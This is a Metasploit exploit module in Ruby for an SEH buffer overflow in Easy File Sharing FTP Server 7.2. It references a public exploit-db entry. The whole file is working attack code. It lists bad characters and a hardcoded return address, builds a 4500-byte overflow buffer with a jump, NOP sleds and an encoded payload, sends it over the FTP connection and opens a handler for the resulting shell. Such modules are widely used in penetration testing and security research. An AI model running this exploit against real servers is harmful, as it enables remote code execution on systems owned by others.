##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Easy File Sharing FTP Server 7.2 SEH Overflow',
      'Description'    => %q{
        This module exploits a SEH overflow in the Easy File Sharing FTP Server 7.2 		software.
      },
      'Author'         => 'Starwarsfan2099 <starwarsfan2099[at]gmail.com>',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'https://www.exploit-db.com/exploits/39008/' ],
        ],
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'Space'    => 390,
          'BadChars' => "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e",
          'StackAdjustment' => -3500,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows Universal',   { 'Ret' => "\x98\x97\x01\x10" } ],
        ],
      'DisclosureDate' => 'December 2, 2015',
      'DefaultTarget'  => 0))
  end

  def exploit
    connect
	print_status("Generating Shell Code")
    sploit = rand_text_alpha_upper(4061)
    sploit << "\xeb\x0A\x90\x90"
    sploit << target.ret
    sploit << make_nops(19)
    sploit << payload.encoded
    sploit << make_nops(7)
	print_status("Buffer length is: #{4500 - 4061 - 4 - 4 - 20 - payload.encoded.length - 20}")
    sploit << rand_text_alpha_upper(4500 - 4061 - 4 - 4 - 20 - payload.encoded.length - 20)
    sploit << " HTTP/1.0\r\n\r\n"
    send_cmd(['GET ', sploit], true)
	print_good("Exploit Sent")
    handler
    disconnect
  end

end
